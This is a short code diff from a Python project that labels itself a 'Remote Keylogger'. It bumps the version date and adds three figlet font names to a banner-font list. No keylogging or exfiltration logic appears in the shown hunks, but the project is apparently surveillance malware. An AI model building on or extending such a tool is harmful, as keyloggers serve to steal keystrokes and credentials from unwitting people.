@@ -1,6 +1,6 @@
 # encoding: utf-8
 # author:   #JahidFariz
-# version:  v20220414
+# version:  v20220415
 # language: Python v3.10.4
 
 # Built-in modules...
@@ -26,7 +26,7 @@ from time import time
 from webbrowser import open as browser
 
 operating_system: str = environment()  # STATIC VARIABLE
-__version__: str = "v20220414"  # DYNAMIC VARIABLE
+__version__: str = "v20220415"  # DYNAMIC VARIABLE
 
 if operating_system == "Windows":
     terminal(command=f"title Remote Keylogger {__version__}")
@@ -1768,6 +1768,9 @@ def start_logging():
         "italic",
         "italics_",
         "ivrit",
+        "jazmine",
+        "jerusalem",
+        "joust___",
     ]  # STATIC VARIABLE
     selected_font: str = choice(figlet_fonts)  # DYNAMIC VARIABLE
 
